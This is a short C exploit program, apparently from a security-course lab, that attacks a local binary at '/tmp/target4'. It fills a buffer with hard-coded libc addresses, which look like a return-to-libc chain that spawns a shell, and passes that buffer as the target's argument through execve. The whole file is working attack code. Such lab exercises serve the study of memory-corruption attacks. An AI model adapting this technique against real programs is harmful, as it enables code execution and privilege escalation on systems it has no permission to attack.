#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"
#define LIBC_BASE 0xf7de1000

int main(void)
{
  char *args[3];
  char *env[1];

  char buf[32];
  uint32_t *addr_ptr = (uint32_t *)(buf);

  *addr_ptr++ = LIBC_BASE + 0x000b8c30;
  *addr_ptr++ = 0;
  *addr_ptr++ = LIBC_BASE + 0x0002f7d0;
  *addr_ptr++ = 0;
  *addr_ptr++ = LIBC_BASE + 0x0015f294;
  
  args[0] = TARGET;
  args[1] = buf;
  args[2] = NULL;

  env[0] = NULL;

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}